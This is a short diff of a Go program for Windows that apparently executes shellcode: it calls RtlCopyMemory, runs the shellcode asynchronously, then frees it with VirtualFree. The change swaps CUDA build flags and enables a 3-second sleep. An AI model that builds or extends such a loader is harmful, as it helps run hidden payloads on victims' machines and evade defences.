@@ -1,7 +1,5 @@
 package main
 
-//#cgo windows LDFLAGS:-LC:/cuda/v12.3/lib/x64
-//#cgo windows CFLAGS: -IC:/cuda/v12.3/include
 import (
 	"C"
 	"encoding/hex"
@@ -16,6 +14,7 @@ import (
 	"github.com/barnex/cuda5/cu"
 	"golang.org/x/sys/windows"
 )
+import "time"
 
 func RtlCopyMemory(dest uintptr, src uintptr, len uint32) (err error) {
 	var ntdll = windows.NewLazySystemDLL("ntdll.dll")
@@ -121,7 +120,7 @@ func main() {
 
 	// Execute the shellcode
 	go asyncExec(addr)
-	//time.Sleep(time.Second * 30)
+	time.Sleep(time.Second * 3)
 
 	// Free memory to get rid of shellcode
 	err = windows.VirtualFree(addr, 0, 0x00008000)
